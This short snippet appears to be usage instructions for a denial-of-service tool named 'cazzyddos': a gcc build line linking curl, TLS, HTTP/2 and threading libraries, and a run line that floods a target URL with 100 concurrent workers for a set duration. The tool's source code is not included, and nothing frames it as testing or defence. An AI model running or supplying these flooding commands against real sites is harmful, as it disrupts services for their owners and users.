```gcc -o cazzyddos cazzyddos.c -lcurl -lssl -lcrypto -lpthread -lnghttp2 -O3 -march=native -Wall -lm```


```./cazzyddos -url https://example.com -duration 5 -concurrency 100
